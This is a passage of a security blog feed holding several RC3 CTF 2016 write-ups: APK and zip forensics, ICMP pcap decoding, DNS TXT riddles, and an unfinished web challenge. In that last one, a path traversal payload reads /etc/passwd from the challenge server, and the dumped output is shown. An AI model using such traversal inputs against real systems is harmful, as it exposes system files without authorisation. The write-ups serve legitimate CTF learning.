    <published>2016-11-21T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Sometimes not all files are needed.<br>Hint:<br>– You probably don’t have to run it</p>
</blockquote>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>For this challenge, we have an apk file nammed <code>youtube.apk</code>. First, let decode it with apktool to see usefull file like AndroidManifest.xml : <code>apktool d youtube.apk</code>.</p>
<p>We know that we are seeking a RC3-2016 flag, so go search in files we extracted :</p>
<ul>
<li><code>cd youtube</code>  </li>
<li><code>find . -type f -exec grep RC3-2016 {} \;</code> =&gt; No result  </li>
<li><code>find . -type f -exec grep RC3 {} \;</code> give this output :</li>
</ul>
<pre><code>new-instance v1, Ljava/util/zip/CRC32;
invoke-direct {v1}, Ljava/util/zip/CRC32;-&gt;&lt;init&gt;()V
invoke-virtual {v1, v4, v8, v0}, Ljava/util/zip/CRC32;-&gt;update([BII)V
invoke-virtual {v1}, Ljava/util/zip/CRC32;-&gt;getValue()J
</code></pre><p>Let’s see if we can find 2016 string somewhere :<br><code>find . -type f -exec grep 2016 {} \;</code> give a loot of string and the last one is a bit weird : <code>UkMz-2016-R09URU0yMQ==</code></p>
<p>Decode this in base64 : flag = <code>RC3-2016-GOTEM21</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 300 - Breaking News - Forensics</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-300-breaking-news/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-forensics-300-breaking-news/</id>
    <published>2016-11-21T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.C.</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>For this challenge, we have a tar.gz file which is containing 20 zip files. These ones are storing txt files. There is a story is these txt files but we can’t see any <code>2016</code> string so the flag isn’t here…<br>So, why don’t examinate the content of zip files to see if we missed something… In a directory where the 20 zip files are stored, we typed : <code>strings *</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">GINg</div><div class="line">Chapter0.txtUT</div><div class="line">L+^=</div><div class="line">&lt;U&lt;i%[</div><div class="line">GINg</div><div class="line">Chapter0.txtUT</div><div class="line">Chapter10.txtUT</div><div class="line">Chapter10.txtUT</div><div class="line">MTYtRFUK</div><div class="line">Chapter11.txtUT</div><div class="line">;X c</div><div class="line">`s;</div><div class="line">(yCc</div><div class="line">_/_PK</div><div class="line">Chapter11.txtUT</div><div class="line">Chapter12.txtUT</div><div class="line">Wow, these Queebloid folks do not fool around.</div><div class="line">Chapter12.txtUT</div><div class="line">Chapter13.txtUT</div><div class="line">H,Q/V(</div><div class="line">,Q(NM</div><div class="line">Chapter13.txtUT</div><div class="line">Chapter14.txtUT</div><div class="line">0gZ+</div><div class="line">?6(U</div><div class="line">Chapter14.txtUT</div><div class="line">Chapter15.txtUT</div><div class="line">Y*mO</div><div class="line">.Xt]</div><div class="line">3oc$M8e</div><div class="line">Chapter15.txtUT</div><div class="line">S1lGCg==</div><div class="line">Chapter16.txtUT</div><div class="line">2VD%</div><div class="line">Chapter16.txtUT</div><div class="line">Chapter17.txtUT</div><div class="line">6[in</div><div class="line">Chapter17.txtUT</div><div class="line">Chapter18.txtUT</div><div class="line">,QH,(HM,*V(</div><div class="line">Chapter18.txtUT</div><div class="line">QkxTCg==</div><div class="line">Chapter19.txtUT</div><div class="line">*Cut to black*</div><div class="line">Chapter19.txtUT</div><div class="line">Chapter1.txtUT</div><div class="line">D&#123;N1</div><div class="line">!Rk\</div><div class="line">^hE3n</div><div class="line">Chapter1.txtUT</div><div class="line">GIKZo=f</div><div class="line">Chapter2.txtUT</div><div class="line">GIKZo=f</div><div class="line">Chapter2.txtUT</div><div class="line">Chapter3.txtUT</div><div class="line">Chapter3.txtUT</div><div class="line">Chapter4.txtUT</div><div class="line">Chapter4.txtUT</div><div class="line">UkMK</div><div class="line">Chapter5.txtUT</div><div class="line">\DjX</div><div class="line">pZzU</div><div class="line">NR!R9</div><div class="line">K4r&gt;&amp;</div><div class="line">Chapter5.txtUT</div><div class="line">Chapter6.txtUT</div><div class="line">Chapter6.txtUT</div><div class="line">Chapter7.txtUT</div><div class="line">Chapter7.txtUT</div><div class="line">Chapter8.txtUT</div><div class="line">Chapter8.txtUT</div><div class="line">Chapter9.txtUT</div><div class="line">K)VH,JU(</div><div class="line">Chapter9.txtUT</div><div class="line">My0yMAo=</div></pre></td></tr></table></figure>
<p>Some base64 encoded strings ?! Let decode <code>MTYtRFUK</code> + <code>S1lGCg==</code> + <code>QkxTCg==</code> + <code>UkMK</code> + <code>My0yMAo=</code>:</p>
<ul>
<li>MTYtRFUK : <em>16-DU</em></li>
<li>S1lGCg== : <em>KYF</em></li>
<li>QkxTCg== : <em>BLS</em></li>
<li>UkMK : <em>RC</em></li>
<li>My0yMAo= : <em>3-20</em></li>
</ul>
<p>So, if we put strings in order of chapter number, we obtain the flag <code>RC3-2016-DUKYFBLS</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 50 - Somepang - Forensics</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-50-somepang/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-forensics-50-somepang/</id>
    <published>2016-11-21T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Examine the file and find the flag.</p>
</blockquote>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>First, open the pcap file with Wireshark. We can see 98906 ICMP frames with the same length. Look at the data, it’s always the same character repeated in each request/reply.<br>The last packet data character is “=” so we can imagine that stuff encoded in base64.<br>Let capture all characters and decode it to a file :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># author : Chill3d</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pcap=rdpcap(<span class="string">"./somepang.pcap"</span> )</div><div class="line">string=<span class="string">""</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> pcap:</div><div class="line">    i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>):</div><div class="line">        string+=str(packet)[<span class="number">-2</span>:]</div><div class="line"></div><div class="line">file_t=open(<span class="string">"flag"</span>,<span class="string">"w"</span> )</div><div class="line">file_t.write(base64.b64decode(string))</div><div class="line">file_t.close()</div><div class="line"></div><div class="line"><span class="keyword">print</span> string</div><div class="line"><span class="keyword">print</span> base64.b64decode(string)</div></pre></td></tr></table></figure>
<p>This will create a file nammed flag. Let’s see which type of file was produced :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file flag</div><div class="line">flag: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 720x449, frames 3</div></pre></td></tr></table></figure>
<p>Open it with a picture viewer :</p>
<p><img src="https://i.imgbox.com/0usuyDAn.jpg" alt="image"></p>
<p>Flag : <code>RC3-2016-PANG-ME-LIKE-ONE-OF-YOU-FRENCH-GORILLAZ</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 200 - Bridge of Cyber - Misc</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-misc-200-bridge-of-cyber/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-misc-200-bridge-of-cyber/</id>
    <published>2016-11-20T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Welcome to the “Bridge of Cyber”! It’s the same concept as the “Bridge of Death” in Holy Grail. Our DNS servers aren’t very good at their job because they ask more questions then they answer. Let’s see if you can get the flag from our DNS.</p>
<p>Nameserver: ns-920.awsdns-51.net</p>
<p>Domain: misc200.ctf.rc3.club</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>What we know:</p>
<ul>
<li>Domain: <code>misc200.ctf.rc3.club</code></li>
<li>Name Server: <code>ns-920.awsdns-51.net</code></li>
<li>We look for questions so probably TXT records</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, rcode: NOERROR, id: 21494</div><div class="line">;; flags: qr aa rd ; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 0</div><div class="line">;; QUESTION SECTION:</div><div class="line">;; misc200.ctf.rc3.club.	IN	TXT</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">misc200.ctf.rc3.club.	300	IN	TXT	&quot;What is the air-speed velocity of an unladen swallow&quot;</div><div class="line"></div><div class="line">;; AUTHORITY SECTION:</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-1526.awsdns-62.org.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-1842.awsdns-38.co.uk.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-489.awsdns-61.com.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-920.awsdns-51.net.</div><div class="line"></div><div class="line">;; ADDITIONAL SECTION:</div><div class="line"></div><div class="line">;; Query time: 225 msec</div><div class="line">;; SERVER: 205.251.195.152</div><div class="line">;; WHEN: Sun Nov 20 12:01:47 2016</div><div class="line">;; MSG SIZE  rcvd: 243</div></pre></td></tr></table></figure>
<p>So we get the first question: “What is the air-speed velocity of an unladen swallow” is a question from “Bridge of Death” in Holy Grail of Monty Python.</p>
<p>The answer is:</p>
<blockquote>
<p>What do you mean? An African or European swallow?</p>
</blockquote>
<p>The first idea that matched “How to send the answer” was by prefixing the answer to the domain.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT</div><div class="line">[...]</div><div class="line">european.misc200.ctf.rc3.club.	300	IN	TXT	&quot;The roundest knight at king arthurs table was sir cumference. He acquired his size from too much __&quot;</div><div class="line">[...]</div></pre></td></tr></table></figure>
<blockquote>
<p>The roundest knight at king Arthur’s round table was Sir Cumference. He acquired his size from too much pi.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT</div><div class="line">[...]</div><div class="line">pi.european.misc200.ctf.rc3.club.	300	IN	TXT	&quot;What is it that no man ever yet did see, which never was, but always is to be?&quot;</div><div class="line">[...]</div></pre></td></tr></table></figure>
<blockquote>
<p>Tomorrow</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill tomorrow.pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT</div><div class="line">[...]</div><div class="line">tomorrow.pi.european.misc200.ctf.rc3.club.	300	IN	TXT	&quot;My favorite things in life don&apos;t cost any money. It&apos;s really clear that the most precious resource we all have is ___&quot;</div><div class="line">[...]</div></pre></td></tr></table></figure>
<blockquote>
<p>My favorite things in life don’t cost any money. It’s really clear that the most precious resource we all have is time.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill time.tomorrow.pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net ANY</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, rcode: NOERROR, id: 52009</div><div class="line">;; flags: qr aa rd ; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 0</div><div class="line">;; QUESTION SECTION:</div><div class="line">;; time.tomorrow.pi.european.misc200.ctf.rc3.club.	IN	TYPE255</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">time.tomorrow.pi.european.misc200.ctf.rc3.club.	300	IN	SPF	&quot;RC3-2016-cyb3rxr05&quot;</div><div class="line"></div><div class="line">;; AUTHORITY SECTION:</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-1526.awsdns-62.org.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-1842.awsdns-38.co.uk.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-489.awsdns-61.com.</div><div class="line">misc200.ctf.rc3.club.	172800	IN	NS	ns-920.awsdns-51.net.</div><div class="line"></div><div class="line">;; ADDITIONAL SECTION:</div><div class="line"></div><div class="line">;; Query time: 5244 msec</div><div class="line">;; SERVER: 205.251.195.152</div><div class="line">;; WHEN: Sun Nov 20 19:48:48 2016</div><div class="line">;; MSG SIZE  rcvd: 235</div></pre></td></tr></table></figure>
<p>So we get the flag: <code>RC3-2016-cyb3rxr05</code>.</p>
<p>Or may be it was possible to do it with <code>african</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]</div><div class="line">$ drill african.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT</div><div class="line">[...]</div><div class="line">african.misc200.ctf.rc3.club.	300	IN	TXT	&quot;Why was the developer broke? He spent all of his&quot;</div><div class="line">[...]</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 300 - Bork Bork - Web</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-web-300-bork-bork/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-web-300-bork-bork/</id>
    <published>2016-11-20T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>UPDATE: We have made changes to this challenge to make it (somewhat) stable. If what you were trying before is not working, it’s because it was causing a problem for us on the back end. I assure you that what you were doing was not the easiest solution, anyway.</p>
<p>We all love doggos and puppers. Have some more of one of our favorite puppers, Gabe. Bork.</p>
<p><a href="https://ctf.rc3.club:3100/" target="_blank" rel="external">https://ctf.rc3.club:3100/</a></p>
<p>author:orkulus</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR</strong>: Warning, this is an incomplete writeup, we didn’t solve this challenge.</p>
<p>We can see the server is not an apache or nginx: <code>Server: Werkzeug/0.11.11 Python/2.7.12</code>.</p>
<p>The dropdown menu is used to select a file (<code>something.txt</code>). The server use <code>cat</code> to read it en write its content into the <code>src</code> attribute of a video balise.</p>
<p>So we will try to disclose some system files into this <code>src</code> with the <code>bork</code> POST attribute.</p>
<p>So let’s see the behaviour with:</p>
<p>bork=test.txt<br><code>&lt;iframe width=&quot;854&quot; height=&quot;480&quot; src=&quot;cat: borks/test.txt: No such file or directory?autoplay=1&amp;loop=1&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</code></p>
<p>bork=../../../../../etc/passwd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;iframe width=&quot;854&quot; height=&quot;480&quot; src=&quot;root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</div><div class="line">syslog:x:104:108::/home/syslog:/bin/false</div><div class="line">_apt:x:105:65534::/nonexistent:/bin/false</div><div class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</div><div class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</div><div class="line">uuidd:x:108:112::/run/uuidd:/bin/false</div><div class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</div><div class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:111:1::/var/cache/pollinate:/bin/false</div><div class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</div><div class="line">ctfuser:x:1001:1001::/home/ctfuser:?autoplay=1&amp;loop=1&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
